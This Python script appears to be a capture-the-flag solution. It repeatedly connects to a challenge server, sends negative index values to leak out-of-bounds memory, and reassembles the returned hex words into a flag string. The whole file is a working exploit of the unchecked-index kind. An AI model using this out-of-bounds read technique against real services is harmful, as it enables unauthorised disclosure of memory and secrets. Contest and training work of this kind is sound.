import time
import socket

def gets(a):
    s = []
    while a > 0:
        s += chr(a%256)
        a //= 256
    return ''.join(s)

ans = ''
for i in range(64//4):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('challs.ctf.site', 20003))
    print(sock.recv(1024))
    time.sleep(1.8)
    print(sock.recv(1024))
    sock.send("%d\n" % (-(64//4-i)*4, ))
    data = sock.recv(1024)
    ans += gets(int(data.split()[3], 16))
    sock.send("%d\n" % (-(64//4-i)*4+1, ))
    data = sock.recv(1024)
    ans += gets(int(data.split()[3], 16))
    sock.send("%d\n" % (-(64//4-i)*4+2, ))
    data = sock.recv(1024)
    ans += gets(int(data.split()[3], 16))
    sock.send("%d\n" % (-(64//4-i)*4+3, ))
    data = sock.recv(1024)
    ans += gets(int(data.split()[3], 16))
    print(ans)
    sock.close()

print()
print(ans)
